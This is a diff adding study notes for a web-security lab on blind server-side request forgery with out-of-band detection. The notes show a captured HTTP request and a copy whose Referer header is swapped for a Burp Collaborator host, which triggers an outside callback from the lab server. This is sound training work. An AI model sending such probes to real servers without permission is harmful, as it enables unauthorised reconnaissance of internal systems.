@@ -32,7 +32,57 @@
 ## lab 3
 
 
-- > need ``colaborator``
+<details>
+  <summary>Lab: Blind SSRF with out-of-band detection</summary>
+
+
+## 1. visit product and see the request replace the ``referrer`` to url form `burp colab`
+
+## **`from`**
+
+```http
+GET /product?productId=10 HTTP/2
+Host: 0aa300db04961214802e3f50008a00aa.web-security-academy.net
+Cookie: session=eKWl8nNqg8d0asyLhuim0DQQUKjA74sW
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0aa300db04961214802e3f50008a00aa.web-security-academy.net/        <=======
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+```
+
+## **`to`**
+
+
+```http
+GET /product?productId=3 HTTP/2
+Host: 0aa300db04961214802e3f50008a00aa.web-security-academy.net
+Cookie: session=eKWl8nNqg8d0asyLhuim0DQQUKjA74sW
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://r7zxj0m1snif5tjpw74kq9bh086zuqif.oastify.com/       <======🔁
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+
+  
+</details>
 
 
 
